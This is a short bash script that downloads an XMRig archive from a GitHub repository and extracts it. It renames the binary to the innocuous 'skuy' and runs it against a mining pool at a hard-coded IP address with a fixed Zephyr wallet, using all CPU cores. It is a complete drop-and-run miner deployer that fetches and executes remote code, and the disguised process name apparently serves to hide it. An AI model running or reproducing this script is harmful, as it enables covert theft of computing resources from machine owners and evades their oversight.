#!/bin/bash
wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
mv xmrig skuy
./skuy --donate-level 1 -o 149.28.143.100:443 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-30000 -n 1)-AJG) -a rx/0 -t $(nproc --all)
